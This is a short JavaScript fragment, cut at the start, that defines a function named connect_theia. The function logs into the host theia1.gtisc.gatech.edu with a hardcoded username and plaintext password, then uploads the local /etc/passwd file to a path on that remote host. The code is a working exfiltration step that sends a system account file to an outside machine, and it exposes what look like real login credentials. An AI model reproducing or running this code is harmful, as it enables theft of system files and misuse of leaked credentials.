...
function connect_theia() {                                                       
	gConnection.account  = "";
	gConnection.host     = "theia1.gtisc.gatech.edu";
	gConnection.login    = "yang";
	gConnection.password = "darpatheia1";

	gConnection.connect();

	gConnection.upload('/etc/passwd', '/home/yang/pwpw2', false, 1000, 1000, null, true, null, '/etc/passwd');
